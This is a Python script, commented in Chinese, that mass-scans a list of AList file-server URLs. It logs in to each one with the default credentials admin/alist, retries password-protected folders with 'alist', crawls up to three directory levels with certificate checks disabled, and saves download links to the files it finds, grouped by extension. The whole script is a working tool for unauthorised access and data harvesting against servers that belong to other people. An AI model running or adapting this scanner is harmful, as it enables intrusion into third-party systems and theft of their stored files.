import requests
import os
import concurrent.futures
from collections import deque
from datetime import datetime
import pytz
import sys

# === 核心参数配置 ===
INPUT_FILE = 'duplicate.txt'
OUTPUT_DIR = 'scan_results'
MAX_THREADS = 50             # 稍微提高并发
TIMEOUT = 5                  # 严格 5 秒超时
MAX_DEPTH = 3                # 深度限制 3 层
MAX_SITE_TIME = 300          # 单个站点最长扫描时间（秒），防止遇到“无底洞”

WEAK_PASSWORDS = [
    {"username": "admin", "password": "alist"},
    {"username": "admin", "password": "admin"},
]

# 排除的后缀：增加了一些常见的噪音文件
SKIP_EXTS = {
    'js', 'css', 'html', 'json', 'png', 'jpg', 'jpeg', 'gif', 'svg', 
    'ico', 'woff', 'woff2', 'ttf', 'otf', 'map', 'md', 'txt'
}

def get_auth_token(base_url, session):
    """尝试获取Token，使用传入的session"""
    login_url = f"{base_url.rstrip('/')}/api/auth/login"
    # 调试阶段可以只试一个最常用的，节省时间
    for payload in WEAK_PASSWORDS[:1]: 
        try:
            r = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and r.json().get("code") == 200:
                return r.json().get("data", {}).get("token")
        except:
            continue
    return None

def get_alist_list(base_url, path, token, session):
    """获取目录列表，严格使用session"""
    api_url = f"{base_url.rstrip('/')}/api/fs/list"
    headers = {"Authorization": token} if token else {}
    payload = {"path": path, "password": "", "page": 1, "per_page": 0}
    
    try:
        resp = session.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
        data = resp.json()
        if data.get("code") == 200:
            return data.get("data", {}).get("content", [])
        
        # 如果需要密码，尝试默认密码 alist
        if data.get("code") in [401, 500]:
            payload["password"] = "alist"
            resp = session.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
            data = resp.json()
            if data.get("code") == 200:
                return data.get("data", {}).get("content", [])
    except:
        pass
    return []

def process_url(url, session):
    """处理单个站点的逻辑"""
    start_time = datetime.now().timestamp()
    token = get_auth_token(url, session)
    local_data = []
    queue = deque([("/", 0)])
    visited_paths = {"/"}
    
    try:
        while queue:
            # 检查单站耗时，防止死循环或超大目录
            if datetime.now().timestamp() - start_time > MAX_SITE_TIME:
                print(f"![时间耗尽] 跳过长耗时站点: {url}")
                break
                
            current_path, depth = queue.popleft()
            if depth > MAX_DEPTH:
                continue
            
            items = get_alist_list(url, current_path, token, session)
            if not items:
                continue
                
            for item in items:
                name = item.get('name')
                full_path = f"{current_path.rstrip('/')}/{name}"
                
                if item.get('is_dir'):
                    if full_path not in visited_paths:
                        visited_paths.add(full_path)
                        queue.append((full_path, depth + 1))
                else:
                    _, ext = os.path.splitext(name)
                    ext = ext.lower().replace('.', '') if ext else "no_ext"
                    
                    if ext in SKIP_EXTS:
                        continue
                        
                    download_url = f"{url.rstrip('/')}/d{full_path}"
                    local_data.append((ext, name, download_url))
    except Exception as e:
        pass
    
    print(f"  [完成] 扫描结束: {url} (发现 {len(local_data)} 文件)")
    return local_data

def main():
    requests.packages.urllib3.disable_warnings()
    
    if not os.path.exists(INPUT_FILE):
        print(f"错误: 找不到 {INPUT_FILE}")
        return

    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        urls = list(set([line.strip() for line in f if line.strip().startswith('http')]))

    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    # === 初始化带连接池的全局 Session ===
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=MAX_THREADS, 
        pool_maxsize=MAX_THREADS * 2,
        max_retries=1 # 减少重试次数，坏站直接放弃
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    final_registry = set()
    total = len(urls)
    print(f"=== 任务启动: 总计 {total} 个站点 ===")

    # 将 session 传入每一个线程
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_url = {executor.submit(process_url, url, session): url for url in urls}
        done_count = 0
        
        # 为了不卡住主进程，我们可以加一个整体的 timeout
        for future in concurrent.futures.as_completed(future_to_url):
            done_count += 1
            url = future_to_url[future]
            if done_count % 10 == 0 or done_count == total:
                print(f">>> 总体进度: {done_count}/{total} (已处理 {url})")
            
            try:
                res = future.result()
                if res:
                    for item in res:
                        final_registry.add(item)
            except Exception as e:
                print(f"站点 {url} 线程异常: {e}")

    # === 分类保存逻辑 ===
    ext_map = {}
    for ext, name, d_url in final_registry:
        if ext not in ext_map: ext_map[ext] = []
        ext_map[ext].append(f"{name} | {d_url}")

    shanghai_tz = pytz.timezone('Asia/Shanghai')
    now_str = datetime.now(shanghai_tz).strftime("%Y-%m-%d %H:%M:%S")

    for ext, lines in ext_map.items():
        file_path = os.path.join(OUTPUT_DIR, f"{ext}.txt")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(f"# 更新时间: {now_str}\n\n")
            for line in sorted(lines):
                f.write(line + "\n")

    print(f"\n=== 任务圆满完成! ===")
    print(f"总计发现有效文件: {len(final_registry)}")
    print(f"保存分类文件夹: {OUTPUT_DIR}")

if __name__ == "__main__":
    main()
